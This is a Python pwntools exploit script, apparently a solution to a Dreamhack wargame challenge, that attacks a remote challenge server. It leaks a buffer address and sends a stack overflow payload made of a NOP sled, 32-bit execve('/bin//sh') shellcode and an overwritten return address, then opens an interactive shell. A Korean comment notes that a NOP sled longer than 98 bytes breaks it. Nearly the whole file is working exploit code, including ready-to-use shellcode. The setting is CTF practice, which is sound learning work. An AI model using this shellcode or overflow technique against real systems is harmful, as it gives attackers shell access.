#!/usr/bin/python

import pwn

pwn.context.log_level = 'debug'

#p = pwn.process("./basic_exploitation_000")
p = pwn.remote("host1.dreamhack.games", 22029)
p.recvuntil("buf = (")
buf = pwn.p32(int(p.recv(10), 16))
print(buf)

payload = b"\x90"*98
payload += b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
payload += b"\x90"*8
payload += buf

"""
payload에 관한 이것저것

shellcode 앞의 nop code의 갯수를 99개 이상 줄 경우 shellcode가 제대로 실행되지 않는다. 무슨 이유에서 그런건지는 아직 불분명하다.
"""
p.send(payload)
p.interactive()